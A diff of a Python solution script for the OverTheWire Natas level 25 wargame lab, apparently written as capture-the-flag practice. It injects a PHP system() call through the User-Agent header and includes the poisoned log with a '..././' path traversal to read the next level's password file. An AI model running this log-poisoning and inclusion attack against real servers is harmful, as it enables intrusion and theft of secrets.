@@ -3,10 +3,11 @@
 import requests
 import re
 
-usn = 'natas24'
+usn = 'natas25'
 url = 'http://%s.natas.labs.overthewire.org/' % usn
-passwd = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'
+passwd = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
 login = (usn, passwd)
+headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26');  ?>"}
 
 request = requests.Session()
 def get_source_code():
@@ -16,6 +17,9 @@ def get_source_code():
 
 
 def solve_lab():
-  connection = request.post(url, data = {'passwd[]':'anything'}, auth = login)
-  pageContent = connection.text 
+  connectionGet = request.get(url, auth=login)
+  sessId = request.cookies['PHPSESSID']
+  #print request.cookies['PHPSESSID'];
+  connectionPost = request.post(url, headers = headers, data = {"lang":"..././..././..././..././..././var/www/natas/natas25/logs/natas25_" + sessId + ".log" }, auth = login)
+  pageContent = connectionPost.text 
   print pageContent
